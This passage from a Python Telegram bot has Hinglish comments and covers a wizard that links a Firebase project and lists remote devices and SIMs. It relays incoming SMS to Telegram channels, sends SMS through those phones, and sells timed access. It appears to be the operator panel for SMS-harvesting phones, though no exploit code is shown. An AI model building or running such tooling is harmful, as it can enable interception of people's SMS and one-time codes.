    await msg.answer(home_text(uid,d), reply_markup=main_menu(uid,d), parse_mode="HTML")

@R.message(Command("menu"))
async def c_menu(msg:Message, state:FSMContext):
    await state.clear(); d=load(); uid=msg.from_user.id
    if not can_use(uid,d): await msg.answer("🚫 Access denied."); return
    ok, not_joined = await check_force_join(msg.bot, uid, d)
    if not ok:
        await msg.answer("📢 <b>Join Required</b>",
            reply_markup=_fj_keyboard(not_joined), parse_mode="HTML"); return
    await msg.answer(home_text(uid,d), reply_markup=main_menu(uid,d), parse_mode="HTML")

# ── Join Request Handler ───────────────────────
# Bot join requests approve NAHI karta.
# Sirf cache mein store karta hai taaki force-join check pass ho sake.
# Channel/group admin ko manually approve karna padega.
@R.chat_join_request()
async def handle_join_request(update: ChatJoinRequest):
    uid     = update.from_user.id
    chat_id = update.chat.id
    _jr_add(chat_id, uid)
    log.info(f"Join request cached uid={uid} chat={chat_id} — NOT auto-approved")

# ══════════════════════════════════════════════
#  FSM HANDLERS
# ══════════════════════════════════════════════
@R.message(W.fb_url)
async def f_fb_url(msg:Message, state:FSMContext):
    d=load(); uid=msg.from_user.id; text=msg.text.strip()
    if not text.startswith("http"):
        await msg.answer("❌ URL must start with <code>https://</code>",parse_mode="HTML"); return
    fsmd=await state.get_data()
    await state.update_data(**fsmd, wiz_fb_url_temp=text.rstrip("/"))
    await state.set_state(W.fb_api_key)
    await msg.answer(
        "✅ Firebase URL save!\n\n"
        "Ab <b>Firebase API Key</b> bhejo:\n"
        "<i>(Firebase Console → Project Settings → Web API Key)</i>",
        parse_mode="HTML", reply_markup=kb([("❌ Cancel","home")]))

@R.message(W.fb_api_key)
async def f_fb_api_key(msg:Message, state:FSMContext):
    d=load(); uid=msg.from_user.id; api_key=msg.text.strip()
    fsmd=await state.get_data()
    fb_url=fsmd.get("wiz_fb_url_temp","")
    u=usr(uid,d); fid=str(int(time.time()))
    u["firebases"].append({"id":fid,"url":fb_url,"api_key":api_key})
    save(d); await state.clear()
    if fsmd.get("wizard"):
        await state.update_data(wizard=True,wiz_fb=fid,wiz_fb_url=fb_url,wiz_fb_api_key=api_key)
        await _wiz_fetch_devices(msg.bot,uid,fb_url,fid,msg)
    else:
        await msg.answer(
            f"✅ Firebase added!\n🔑 API Key: <code>{api_key[:20]}…</code>",
            parse_mode="HTML",
            reply_markup=list_kb(u["firebases"],"id","url","fb:del:","fb:add","my:menu"))

@R.message(W.dev_manual)
async def f_dev_manual(msg:Message, state:FSMContext):
    d=load(); uid=msg.from_user.id; did=msg.text.strip()
    u=usr(uid,d); fsmd=await state.get_data(); cache=u.get("_dev_cache",{})
    if did in cache:
        dd=cache[did]; name=dd.get("deviceName") or dd.get("name") or did[:20]
        sims=dd.get("sims",[]); fb_id=fsmd.get("wiz_fb","")
        if did not in [x["id"] for x in u.get("devices",[])]:
            u["devices"].append({"id":did,"name":name,"fb_id":fb_id,"sims":sims})
        save(d); await state.clear()
        if fsmd.get("wizard"):
            await state.update_data(**fsmd,wiz_dev=did,wiz_sims_avail=sims,wiz_sims_sel=[])
            if sims:
                await msg.answer(wiz_card(3,5,"Select SIM(s)","Tap to toggle ✅"),
                    reply_markup=sim_kb(sims,[],did),parse_mode="HTML")
            else:
                await state.update_data(**fsmd,wiz_dev=did,wiz_sims=[0])
                await msg.answer(wiz_card(4,5,"Select Channel"),
                    reply_markup=ch_pick_kb(u.get("channels",[])),parse_mode="HTML")
        else:
            await msg.answer(f"✅ Device <b>{name}</b> added!",
                reply_markup=list_kb(u["devices"],"id","name","dev:del:","dev:add","my:menu"),
                parse_mode="HTML")
    else:
        await msg.answer(f"❌ <code>{did}</code> not found. Try again:",parse_mode="HTML")

@R.message(W.ch_input)
async def f_ch_input(msg:Message, state:FSMContext):
    d=load(); uid=msg.from_user.id; text=msg.text.strip(); u=usr(uid,d)
    cid=int(text) if text.lstrip("-").isdigit() else text
    if str(cid) not in [str(c["id"]) for c in u.get("channels",[])]:
        u["channels"].append({"id":cid,"name":text})
    save(d); fsmd=await state.get_data(); await state.clear()
    if fsmd.get("wizard"):
        await state.update_data(**fsmd,wiz_ch=cid)
        await msg.answer(wiz_card(5,5,"Repeat Count","How many times per SMS?"),
            reply_markup=repeat_kb(),parse_mode="HTML")
    else:
        await msg.answer(f"✅ Channel <code>{text}</code> added!",
            reply_markup=list_kb(u["channels"],"id","name","ch:del:","ch:add","my:menu"),
            parse_mode="HTML")

@R.message(W.repeat_cust)
async def f_repeat_cust(msg:Message, state:FSMContext):
    d=load(); uid=msg.from_user.id
    try:
        n=int(msg.text.strip())
        if not 1<=n<=20: raise ValueError
    except:
        await msg.answer("❌ Enter 1–20."); return
    fsmd=await state.get_data(); await state.clear()
    if fsmd.get("wizard"): await _wiz_finish(msg.bot,uid,{**fsmd,"wiz_repeat":n},d)
    else: await msg.answer("✅ Set!",reply_markup=main_menu(uid,d))

@R.message(W.test_to)
async def f_test_to(msg:Message,state:FSMContext):
    await state.update_data(test_to=msg.text.strip())
    await state.set_state(W.test_msg)
    await msg.answer("💬 Enter message text:")

@R.message(W.test_msg)
async def f_test_msg(msg:Message,state:FSMContext):
    d=load(); uid=msg.from_user.id; fsmd=await state.get_data()
    to=fsmd.get("test_to",""); u=usr(uid,d); ac=u.get("active",{}); await state.clear()
    if not ac.get("fb_url"):
        await msg.answer("❌ No active combo. Run wizard first."); return
    wait=await msg.answer("📤 Sending…")
    ok=await send_via_fb(ac["fb_url"],ac["device_id"],ac.get("sims",[0])[0],to,msg.text.strip())
    await wait.delete()
    await msg.answer(f"{'✅ Sent!' if ok else '❌ Failed!'}\n📞 <code>{to}</code>",
        reply_markup=kb([("🏠 Home","home")]),parse_mode="HTML")

@R.message(W.fwd_add)
async def f_fwd_add(msg:Message,state:FSMContext):
    d=load(); uid=msg.from_user.id; u=usr(uid,d)
    if msg.text.strip() not in u["fwd"]: u["fwd"].append(msg.text.strip())
    save(d); await state.clear()
    await msg.answer(f"✅ Added: <code>{msg.text.strip()}</code>",reply_markup=_fwd_kb(uid,d),parse_mode="HTML")

@R.message(W.adm_add)
async def f_adm_add(msg:Message,state:FSMContext):
    if not (is_owner(msg.from_user.id) or is_super_admin(msg.from_user.id,load())):
        await state.clear(); return
    d=load()
    try:
        nid=int(msg.text.strip())
        if nid not in d["admins"]: d["admins"].append(nid)
        save(d); await state.clear()
        await msg.answer(f"✅ Admin added: <code>{nid}</code>",
            reply_markup=adm_menu_kb(msg.from_user.id,d),parse_mode="HTML")
        try: await msg.bot.send_message(nid,"🎉 You're now an <b>Admin</b>! Send /start",parse_mode="HTML")
        except: pass
    except: await msg.answer("❌ Invalid user ID.")

@R.message(W.ban_id)
async def f_ban_id(msg:Message, state:FSMContext):
    if not is_admin(msg.from_user.id): await state.clear(); return
    d = load()
    try:
        bid = int(msg.text.strip())
        if is_admin(bid, d):
            await msg.answer("❌ Admin ko ban nahi kar sakte!")
            return
        if bid not in d.setdefault("banned", []):
            d["banned"].append(bid)
        save(d); await state.clear()
        await msg.answer(
            f"🚫 <b>Ban ho gaya:</b> <code>{bid}</code>",
            reply_markup=adm_menu_kb(msg.from_user.id, d), parse_mode="HTML")
        try:
            await msg.bot.send_message(bid, "🚫 Aapko ban kar diya gaya hai. Admin se sampark karein.")
        except: pass
    except:
        await msg.answer("❌ Invalid user ID. Sirf numeric ID bhejo.")

@R.message(W.sadm_add)
async def f_sadm_add(msg:Message,state:FSMContext):
    if not is_owner(msg.from_user.id): await state.clear(); return
    d=load()
    try:
        nid=int(msg.text.strip())
        if nid not in d.setdefault("super_admins",[]): d["super_admins"].append(nid)
        save(d); await state.clear()
        await msg.answer(f"✅ Super Admin added: <code>{nid}</code>",
            reply_markup=sadm_menu_kb(d),parse_mode="HTML")
        try: await msg.bot.send_message(nid,"🌟 You're now a <b>Super Admin</b>! Send /start",parse_mode="HTML")
        except: pass
    except: await msg.answer("❌ Invalid user ID.")

@R.message(W.usr_add_id)
async def f_usr_add_id(msg:Message,state:FSMContext):
    try:
        uid2=int(msg.text.strip())
        await state.update_data(new_uid=uid2); await state.set_state(W.usr_add_exp)
        await msg.answer(f"✅ User ID: <code>{uid2}</code>\n\n⏱ <b>Select access duration:</b>",
            reply_markup=timed_kb(),parse_mode="HTML")
    except: await msg.answer("❌ Send a valid Telegram user ID.")

@R.message(W.usr_add_exp)
async def f_usr_add_exp(msg:Message,state:FSMContext):
    d=load(); uid=msg.from_user.id; text=msg.text.strip()
    fsmd=await state.get_data(); uid2=fsmd.get("new_uid"); await state.clear()
    try:
        for fmt in ("%d/%m/%Y","%Y-%m-%d","%d-%m-%Y"):
            try: dt=datetime.strptime(text,fmt); exp=dt.timestamp(); break
            except: pass
        else: raise ValueError
        _add_timed(uid2,exp,uid,d); save(d)
        await msg.answer(f"✅ User <code>{uid2}</code> added until <code>{text}</code>",
            reply_markup=adm_menu_kb(uid,d),parse_mode="HTML")
        try: await msg.bot.send_message(uid2,f"✅ Access until <code>{text}</code>.\nSend /start",parse_mode="HTML")
        except: pass
    except: await msg.answer("❌ Invalid date. Use DD/MM/YYYY")

@R.message(W.fj_add)
async def f_fj_add(msg:Message, state:FSMContext):
    """
    3-step flow:
      Step 1 — link/username bhejo (redirect button ke liye)
      Step 2 — chat ID bhejo (join check ke liye, dono public/private)
      Step 3 — display name bhejo (button pe dikhega)
    """
    if not (is_owner(msg.from_user.id) or is_super_admin(msg.from_user.id, load())):
        await state.clear(); return

    uid  = msg.from_user.id
    text = msg.text.strip()
    fsmd = await state.get_data()

    # ── Step 3: title ─────────────────────────────────────
    if fsmd.get("fj_step") == "awaiting_title":
        link    = fsmd.get("fj_link", "")
        chat_id = fsmd.get("fj_chat_id", "")
        title   = text
        d  = load()
        fj = d.setdefault("force_join", [])
        if not any(str(c["id"]) == str(chat_id) for c in fj):
            fj.append({"id": chat_id, "title": title, "link": link})
        save(d); await state.clear()
        log.info(f"FJ added: title={title} id={chat_id} link={link}")
        await msg.answer(
            f"✅ <b>Force Join Added!</b>\n\n"
            f"📢 <b>{title}</b>\n"
            f"🆔 <code>{str(chat_id)[:40]}</code>\n"
            f"🔗 <code>{str(link)[:40] or '—'}</code>\n\n"
            f"⚠️ <i>Bot ko us channel/group mein admin banana zaroori hai!</i>",
            reply_markup=fj_menu_kb(uid, load()), parse_mode="HTML")
        return

    # ── Step 2: chat ID ───────────────────────────────────
    if fsmd.get("fj_step") == "awaiting_chat_id":
        raw = text
        if raw.lstrip("-").isdigit():
            chat_id = int(raw)
        elif raw.startswith("@"):
            chat_id = raw
        else:
            await msg.answer(
                "❌ Sahi Chat ID bhejo:\n"
                "• Numeric: <code>-1001234567890</code>\n"
                "• Ya: <code>@username</code>\n\n"
                "📋 Chat ID kaise nikaalein:\n"
                "Channel ka koi message forward karo <code>@userinfobot</code> ko",
                parse_mode="HTML")
            return
        await state.update_data(fj_step="awaiting_title", fj_chat_id=chat_id)
        await msg.answer(
            f"✅ Chat ID save: <code>{chat_id}</code>\n\n"
            f"Ab <b>display name</b> bhejo (jo join button pe dikhega):\n"
            f"<i>Example: My Channel, Main Group</i>",
            parse_mode="HTML", reply_markup=kb([("❌ Cancel", "fj:menu")]))
        return

    # ── Step 1: link / username ────────────────────────────
    tm = re.search(r"t\.me/([+\w]+)", text)
    if tm:
        link = f"https://t.me/{tm.group(1)}"
    elif text.startswith("@"):
        link = f"https://t.me/{text.lstrip('@')}"
    elif text.startswith("http"):
        link = text
    elif text.lstrip("-").isdigit():
        # Direct chat ID diya — skip link step
        chat_id = int(text)
        await state.update_data(fj_step="awaiting_title", fj_link="", fj_chat_id=chat_id)
        await msg.answer(
            f"✅ Chat ID mila: <code>{chat_id}</code>\n\n"
            f"Ab <b>display name</b> bhejo (jo join button pe dikhega):",
            parse_mode="HTML", reply_markup=kb([("❌ Cancel", "fj:menu")]))
        return
    else:
        link = f"https://t.me/{text.lstrip('@')}"

    await state.update_data(fj_step="awaiting_chat_id", fj_link=link)
    await msg.answer(
        f"✅ Link save: <code>{link}</code>\n\n"
        f"Ab <b>Chat ID</b> bhejo — join check ke liye zaroori hai\n"
        f"(public aur private dono ke liye)\n\n"
        f"📋 <b>Chat ID kaise nikaalein:</b>\n"
        f"Channel/group ka koi bhi message forward karo\n"
        f"<code>@userinfobot</code> ko → ID milegi\n"
        f"Example: <code>-1001234567890</code>",
        parse_mode="HTML", reply_markup=kb([("❌ Cancel", "fj:menu")]))

# ══════════════════════════════════════════════
#  CALLBACKS
# ══════════════════════════════════════════════
@R.callback_query()
async def cb(cq:CallbackQuery, state:FSMContext):
    d=load(); uid=cq.from_user.id; c=cq.data
    if not can_use(uid,d): await cq.answer("🚫 Access denied.",show_alert=True); return
    u=usr(uid,d); log.debug(f"CB uid={uid} c={c}")

    # Force join check on home
    if c in ("home","fj:check"):
        await state.clear()
        ok, not_joined = await check_force_join(cq.bot, uid, d)
        if not ok:
            await sedit(cq,"📢 <b>Join Required</b>\n\nJoin all channels to continue:",
                _fj_keyboard(not_joined))
            if c=="fj:check": await cq.answer("❌ Please join all channels first!",show_alert=True)
            return
        await sedit(cq, home_text(uid,d), main_menu(uid,d))
        if c=="fj:check": await cq.answer("✅ Verified! Welcome!",show_alert=True)

    elif c=="help:show":
        await sedit(cq, HELP_TEXT, kb([("🔙 Back","home")]))

    elif c=="wiz:start":
        await state.clear()
        fbs=u.get("firebases",[])
        ac=u.get("active",{})
        if fbs or ac.get("fb_url"):
            # Already setup — block karo, reset se naya karo
            await sedit(cq,
                "⚠️ <b>Firebase already setup hai!</b>\n\n"
                "Ek waqt mein sirf <b>1 Firebase</b> allowed hai.\n\n"
                "Naya setup karne ke liye pehle:\n"
                "<b>Reset Me</b> → phir wapas wizard chalao.",
                kb([("🗑 Reset & Setup New","wiz:reset_and_start"),("🔙 Back","home")]),
                parse_mode="HTML")
        else:
            await state.update_data(wizard=True); await state.set_state(W.fb_url)
            await sedit(cq,wiz_card(1,5,"Firebase URL","https://your-project.firebaseio.com"),
                kb([("❌ Cancel","home")]))

    elif c=="wiz:reset_and_start":
        # Reset user firebase/devices/active, then start wizard fresh
        d2=load(); u2=usr(uid,d2)
        u2["firebases"]=[]; u2["devices"]=[]; u2["active"]={}; u2["monitoring"]=False
        save(d2); await state.clear()
        await state.update_data(wizard=True); await state.set_state(W.fb_url)
        await sedit(cq,wiz_card(1,5,"Firebase URL","https://your-project.firebaseio.com"),
            kb([("❌ Cancel","home")]))

    elif c=="wiz:retry_dev":
        fsmd=await state.get_data()
        if fsmd.get("wiz_fb_url"):
            await _wiz_fetch_devices(cq.bot,uid,fsmd["wiz_fb_url"],fsmd.get("wiz_fb",""),cq)

    elif c.startswith("wpick:fb:"):
        fid=c.split("wpick:fb:",1)[1]
        fb=next((f for f in u.get("firebases",[]) if f["id"]==fid),None)
        if not fb: await cq.answer("Not found!",show_alert=True); return
        await state.update_data(wizard=True,wiz_fb=fid,wiz_fb_url=fb["url"])
        await _wiz_fetch_devices(cq.bot,uid,fb["url"],fid,cq)

    elif c.startswith("faddpg:"):
        page=int(c.split(":")[1]); cache=u.get("_dev_cache",{})
        online={k:v for k,v in cache.items() if dev_online(v)}
        await sedit(cq,wiz_card(2,5,"Select Device",f"Page {page+1}"),online_devs_kb(online,page))

    elif c.startswith("fadd:"):
        did=c.split("fadd:",1)[1]; cache=u.get("_dev_cache",{})
        dd=cache.get(did,{}); name=dd.get("deviceName") or dd.get("name") or did[:20]
        sims=dd.get("sims",[]); fsmd=await state.get_data()
        if did not in [x["id"] for x in u.get("devices",[])]:
            u["devices"].append({"id":did,"name":name,"fb_id":fsmd.get("wiz_fb",""),"sims":sims})
            save(d)
        if sims:
            await state.update_data(wiz_dev=did,wiz_sims_avail=sims,wiz_sims_sel=[])
            await sedit(cq,wiz_card(3,5,"Select SIM(s)","Tap to toggle ✅"),sim_kb(sims,[],did))
        else:
            await state.update_data(wiz_dev=did,wiz_sims=[0])
            await sedit(cq,wiz_card(4,5,"Select Channel"),ch_pick_kb(u.get("channels",[])))

    elif c=="dev:manual":
        fsmd=await state.get_data(); await state.update_data(**fsmd)
        await state.set_state(W.dev_manual)
        await sedit(cq,"🔍 Enter Device ID manually:",kb([("❌ Cancel","home")]))

    elif c.startswith("simtog:"):
        parts=c.split(":"); did=parts[1]; idx=int(parts[2])
        fsmd=await state.get_data(); sel=list(fsmd.get("wiz_sims_sel",[]))
        if idx in sel: sel.remove(idx)
        else: sel.append(idx)
        await state.update_data(wiz_sims_sel=sel)
        sims=fsmd.get("wiz_sims_avail",[])
        await sedit(cq,wiz_card(3,5,"Select SIM(s)",f"{len(sel)} selected"),sim_kb(sims,sel,did))

    elif c.startswith("simok:"):
        fsmd=await state.get_data(); sel=fsmd.get("wiz_sims_sel",[])
        if not sel: await cq.answer("Select at least one SIM!",show_alert=True); return
        await state.update_data(wiz_sims=sel)
        chs=u.get("channels",[])
        if chs:
            await sedit(cq,wiz_card(4,5,"Select Channel"),ch_pick_kb(chs))
        else:
            await state.set_state(W.ch_input)
            await sedit(cq,wiz_card(4,5,"Channel","Send @username or chat ID"),kb([("❌ Cancel","home")]))

    elif c.startswith("wpick:ch:"):
        cid=c.split("wpick:ch:",1)[1]
        ch=next((x for x in u.get("channels",[]) if str(x["id"])==str(cid)),None)
        if not ch: await cq.answer("Not found!",show_alert=True); return
        fsmd=await state.get_data(); await state.update_data(**fsmd,wiz_ch=ch["id"])
        await sedit(cq,wiz_card(5,5,"Repeat Count","Times to send per SMS"),repeat_kb())

    elif c.startswith("wpick:dev:"):
        did=c.split("wpick:dev:",1)[1]
        dv=next((x for x in u.get("devices",[]) if x["id"]==did),None)
        if not dv: await cq.answer("Not found!",show_alert=True); return
        sims=dv.get("sims",[]); fsmd=await state.get_data()
        if sims:
            await state.update_data(**fsmd,wiz_dev=did,wiz_sims_avail=sims,wiz_sims_sel=[])
            await sedit(cq,wiz_card(3,5,"Select SIM(s)","Tap to toggle"),sim_kb(sims,[],did))
        else:
            await state.update_data(**fsmd,wiz_dev=did,wiz_sims=[0])
            await sedit(cq,wiz_card(4,5,"Select Channel"),ch_pick_kb(u.get("channels",[])))

    elif c.startswith("wpick:devpg:"):
        page=int(c.split(":")[-1])
        await sedit(cq,wiz_card(2,5,"Select Device",f"Page {page+1}"),dev_pick_kb(u.get("devices",[]),page))

    elif c.startswith("rpt:"):
        val=c.split(":")[1]; fsmd=await state.get_data()
        if val=="c":
            await state.update_data(**fsmd); await state.set_state(W.repeat_cust)
            await sedit(cq,"✏️ Enter repeat count (1–20):",kb([("❌ Cancel","home")]))
        else:
            rpt=int(val); await state.clear()
            await sedit(cq,"⏳ Starting monitor…")
            await _wiz_finish(cq.bot,uid,{**fsmd,"wiz_repeat":rpt},load())

    elif c=="mon:go":
        if u.get("monitoring"):
            _stop_mon(uid); u["monitoring"]=False; save(d)
            await sedit(cq,"⏸ <b>Monitor Stopped.</b>",main_menu(uid,load()))
        else:
            if not u.get("active",{}).get("fb_url"):
                await cq.answer("❌ Run Setup Wizard first!",show_alert=True); return
            u["monitoring"]=True; save(d); _start_mon(cq.bot,uid)
            await sedit(cq,"🟢 <b>Monitor Started!</b>",main_menu(uid,load()))

    elif c=="dash:show":
        d2=load(); u2=usr(uid,d2)
        await sedit(cq,
            f"📊 <b>Dashboard</b>\n\n{combo_card(u2)}\n\n{stats_card(u2)}\n\n{setup_card(u2)}",
            kb([("🔄 Refresh","dash:show"),("🏠 Home","home")]))

    elif c=="my:menu":
        await sedit(cq,"⚙️ <b>My Settings</b>",
            kb([(f"🔥 Firebase ({len(u.get('firebases',[]))})", "fb:list"),
                (f"📱 Devices ({len(u.get('devices',[]))})",   "dev:list")],
               [(f"📺 Channels ({len(u.get('channels',[]))})", "ch:list"),
                ("🧪 Test SMS", "test:go")],
               [("🔙 Back","home")]))

    elif c=="fb:list":
        await sedit(cq,"🔥 <b>Firebase URLs</b>",
            list_kb(u.get("firebases",[]),"id","url","fb:del:","fb:add","my:menu"))

    elif c=="fb:add":
        await state.set_state(W.fb_url)
        await sedit(cq,"🔥 Send Firebase URL:",kb([("❌ Cancel","fb:list")]))

    elif c.startswith("fb:del:"):
        fid=c.split("fb:del:",1)[1]
        u["firebases"]=[f for f in u.get("firebases",[]) if f["id"]!=fid]
        save(d); await cq.answer("🗑 Removed.")
        await sedit(cq,"🔥 <b>Firebase URLs</b>",
            list_kb(u.get("firebases",[]),"id","url","fb:del:","fb:add","my:menu"))

    elif c=="dev:list":
        await sedit(cq,"📱 <b>Devices</b>",
            list_kb(u.get("devices",[]),"id","name","dev:del:","dev:add","my:menu"))

    elif c=="dev:add":
        fbs=u.get("firebases",[])
        if not fbs: await cq.answer("❌ Add Firebase first!",show_alert=True); return
        fb=fbs[0]; await state.update_data(wizard=False,wiz_fb=fb["id"],wiz_fb_url=fb["url"])
        await _wiz_fetch_devices(cq.bot,uid,fb["url"],fb["id"],cq)

    elif c.startswith("dev:del:"):
        did=c.split("dev:del:",1)[1]
        u["devices"]=[x for x in u.get("devices",[]) if x["id"]!=did]
        save(d); await cq.answer("🗑 Removed.")
        await sedit(cq,"📱 <b>Devices</b>",
            list_kb(u.get("devices",[]),"id","name","dev:del:","dev:add","my:menu"))

    elif c=="ch:list":
        await sedit(cq,"📺 <b>Channels</b>",
            list_kb(u.get("channels",[]),"id","name","ch:del:","ch:add","my:menu"))

    elif c=="ch:add":
        await state.set_state(W.ch_input)
        await sedit(cq,"📺 Send channel <code>@username</code> or chat ID:",kb([("❌ Cancel","ch:list")]))

    elif c.startswith("ch:del:"):
        cid=c.split("ch:del:",1)[1]
        u["channels"]=[x for x in u.get("channels",[]) if str(x["id"])!=cid]
        save(d); await cq.answer("🗑 Removed.")
        await sedit(cq,"📺 <b>Channels</b>",
            list_kb(u.get("channels",[]),"id","name","ch:del:","ch:add","my:menu"))

    elif c=="test:go":
        if not u.get("active",{}).get("fb_url"):
            await cq.answer("❌ Run wizard first!",show_alert=True); return
        await state.set_state(W.test_to)
        await sedit(cq,"🧪 <b>Test SMS</b>\n\nEnter recipient number:",kb([("❌ Cancel","my:menu")]))

    elif c=="fwd:menu":
        await sedit(cq,"📤 <b>Forward Targets</b>",_fwd_kb(uid,d))

    elif c=="fwd:add":
        await state.set_state(W.fwd_add)
        await sedit(cq,"📤 Send <code>@username</code> or chat ID:",kb([("❌ Cancel","fwd:menu")]))

    elif c.startswith("fwd:del:"):
        tgt=c.split("fwd:del:",1)[1]
        u["fwd"]=[t for t in u.get("fwd",[]) if str(t)!=tgt]
        save(d); await cq.answer("🗑 Removed.")
        await sedit(cq,"📤 <b>Forward Targets</b>",_fwd_kb(uid,d))

    elif c=="reset:self":
        await sedit(cq,"⚠️ <b>Reset your data?</b>",
            kb([("✅ Yes","reset:self:yes"),("❌ Cancel","home")]))

    elif c=="reset:self:yes":
        _stop_mon(uid); d2=load(); d2["users"][str(uid)]=_new_user(); save(d2)
        await sedit(cq,"✅ <b>Data reset.</b>",main_menu(uid,load()))

    elif c=="adm:menu":
        if not is_admin(uid,d): await cq.answer("🚫",show_alert=True); return
        await sedit(cq,"🛡 <b>Admin Tools</b>",adm_menu_kb(uid,d))

    elif c=="adm:users":
        if not is_admin(uid,d): await cq.answer("🚫",show_alert=True); return
        lines=["👥 <b>All Users:</b>\n"]
        for k,v in d.get("users",{}).items():
            mon="🟢" if v.get("monitoring") else "🔴"
            s=v.get("stats",{}); lines.append(f"  {mon} <code>{k}</code> ✅{s.get('sent',0)} ❌{s.get('failed',0)}")
        for k,v in d.get("timed_users",{}).items():
            rem=v.get("expires",0)
            exp=datetime.fromtimestamp(rem).strftime("%d/%m %H:%M") if rem else "∞"
            lines.append(f"  ⏱ <code>{k}</code> exp:{exp}")
        await sedit(cq,"\n".join(lines) or "No users.",kb([("🔙 Back","adm:menu")]))

    elif c=="adm:adduser":
        if not is_admin(uid,d): await cq.answer("🚫",show_alert=True); return
        await state.set_state(W.usr_add_id)
        await sedit(cq,"👤 <b>Add User</b>\n\nSend Telegram user ID:",kb([("❌ Cancel","adm:menu")]))

    elif c.startswith("tacc:"):
        val=c.split(":")[1]; fsmd=await state.get_data(); uid2=fsmd.get("new_uid")
        if not uid2: await cq.answer("Session expired.",show_alert=True); return
        if val=="custom":
            await state.set_state(W.usr_add_exp)
            await sedit(cq,"📅 Send expiry date (DD/MM/YYYY):",kb([("❌ Cancel","adm:menu")])); return
        secs=int(val); exp=None if secs==0 else time.time()+secs
        d2=load(); _add_timed(uid2,exp,uid,d2); save(d2); await state.clear()
        label="Permanent ♾" if secs==0 else f"{secs//3600}h"
        await sedit(cq,f"✅ User <code>{uid2}</code> — <b>{label}</b>",adm_menu_kb(uid,d2))
        try:
            m2="♾ Permanent" if secs==0 else f"⏱ {secs//3600}h"
            await cq.bot.send_message(uid2,f"✅ Access: <b>{m2}</b>\nSend /start",parse_mode="HTML")
        except: pass

    elif c=="adm:stats":
        if not is_admin(uid,d): await cq.answer("🚫",show_alert=True); return
        users=d.get("users",{}); ts=0; tf=0
        for v in users.values():
            s=v.get("stats",{}); ts+=s.get("sent",0); tf+=s.get("failed",0)
        bar=pbar(ts,ts+tf,"round",8) if ts+tf else "○"*8
        await sedit(cq,
            f"📊 <b>Global Stats</b>\n\n"
            f"  {bar}  {pct(ts,ts+tf)}\n\n"
            f"  👥 Users      : <code>{len(users)}</code>\n"
            f"  🟢 Monitoring : <code>{sum(1 for v in users.values() if v.get('monitoring'))}</code>\n"
            f"  ✅ Total Sent : <code>{ts}</code>\n"
            f"  ❌ Total Fail : <code>{tf}</code>",
            kb([("🔙 Back","adm:menu")]))

    elif c=="adm:free":
        if not (is_owner(uid) or is_super_admin(uid,d)):
            await cq.answer("🚫 Owner/Super Admin only!",show_alert=True); return
        d["free"]=not d.get("free",False); save(d)
        await cq.answer(f"Free Mode: {'ON ✅' if d['free'] else 'OFF 🔴'}")
        await sedit(cq,"🛡 <b>Admin Tools</b>",adm_menu_kb(uid,d))

    elif c=="adm:addadmin":
        if not (is_owner(uid) or is_super_admin(uid,d)):
            await cq.answer("🚫",show_alert=True); return
        await state.set_state(W.adm_add)
        await sedit(cq,"➕ <b>Add Admin</b>\n\nSend Telegram user ID:",kb([("❌ Cancel","adm:menu")]))

    elif c=="adm:zip":
        if not is_owner(uid): await cq.answer("🚫 Owner only!",show_alert=True); return
        await cq.answer("📦 Preparing…")
        zdata=make_zip()
        fname=f"smsbot_{datetime.now().strftime('%Y%m%d_%H%M')}.zip"
        await cq.bot.send_document(uid,BufferedInputFile(zdata,filename=fname),
            caption=f"📦 <b>Export</b> <code>{fname}</code>\n<i>by {_CREDITS}</i>",parse_mode="HTML")

    elif c=="adm:resetall":
        if not is_owner(uid): await cq.answer("🚫 Owner only!",show_alert=True); return
        await sedit(cq,"💥 <b>Reset ALL users?</b>",
            kb([("✅ Yes","adm:resetall:yes"),("❌ Cancel","adm:menu")]))

    elif c=="adm:resetall:yes":
        if not is_owner(uid): await cq.answer("🚫",show_alert=True); return
        for t in _tasks.values(): t.cancel()
        _tasks.clear(); _seen.clear()
        d2=load(); d2["users"]={};d2["timed_users"]={}; save(d2)
        await sedit(cq,"💥 <b>All data reset.</b>",adm_menu_kb(uid,load()))

    # ── Ban / Unban (all admins) ───────────────────
    elif c=="ban:do":
        if not is_admin(uid,d): await cq.answer("🚫",show_alert=True); return
        await state.set_state(W.ban_id)
        await sedit(cq,"🚫 <b>Ban User</b>\n\nBan karne ke liye Telegram User ID bhejo:",
            kb([("❌ Cancel","adm:menu")]))

    elif c=="unban:do":
        if not is_admin(uid,d): await cq.answer("🚫",show_alert=True); return
        banned=d.get("banned",[])
        if not banned:
            await cq.answer("✅ Koi bhi banned nahi hai!",show_alert=True); return
        lines=["✅ <b>Banned Users — Unban karo:</b>\n"]
        rows=[]
        for bid in banned:
            rows.append([(f"🔓 {bid}", f"unban:uid:{bid}")])
        rows.append([("❌ Cancel","adm:menu")])
        await sedit(cq,"\n".join(lines),InlineKeyboardMarkup(inline_keyboard=rows))

    elif c.startswith("unban:uid:"):
        if not is_admin(uid,d): await cq.answer("🚫",show_alert=True); return
        bid=int(c.split("unban:uid:",1)[1])
        d2=load()
        if bid in d2.get("banned",[]): d2["banned"].remove(bid)
        save(d2)
        await cq.answer(f"✅ {bid} unban ho gaya!",show_alert=True)
        await sedit(cq,f"✅ <b>Unban ho gaya:</b> <code>{bid}</code>",adm_menu_kb(uid,d2))
        try: await cq.bot.send_message(bid,"✅ Aapka ban hata diya gaya. /start karein.",parse_mode="HTML")
        except: pass

    # ── Super Admin management (Owner only) ───────
    elif c=="sadm:menu":
        if not is_owner(uid): await cq.answer("🚫 Owner only!",show_alert=True); return
        await sedit(cq,"🌟 <b>Super Admins</b>",sadm_menu_kb(d))

    elif c=="sadm:add":
        if not is_owner(uid): await cq.answer("🚫 Owner only!",show_alert=True); return
        await state.set_state(W.sadm_add)
        await sedit(cq,"🌟 <b>Add Super Admin</b>\n\nSend Telegram user ID:",
            kb([("❌ Cancel","sadm:menu")]))

    elif c.startswith("sadm:del:"):
        if not is_owner(uid): await cq.answer("🚫 Owner only!",show_alert=True); return
        sid=int(c.split("sadm:del:",1)[1])
        if sid in SUPER_ADMINS:
            await cq.answer("🚫 Cannot remove hardcoded Super Admin.",show_alert=True); return
        d2=load()
        if sid in d2.get("super_admins",[]): d2["super_admins"].remove(sid)
        save(d2); await cq.answer("🗑 Removed.")
        await sedit(cq,"🌟 <b>Super Admins</b>",sadm_menu_kb(d2))

    # ── Force join management ──────────────────────
    elif c=="fj:menu":
        if not is_admin(uid,d): await cq.answer("🚫",show_alert=True); return
        await sedit(cq,"📢 <b>Force Join Channels</b>",fj_menu_kb(uid,d))

    elif c=="fj:add":
        if not (is_owner(uid) or is_super_admin(uid,d)):
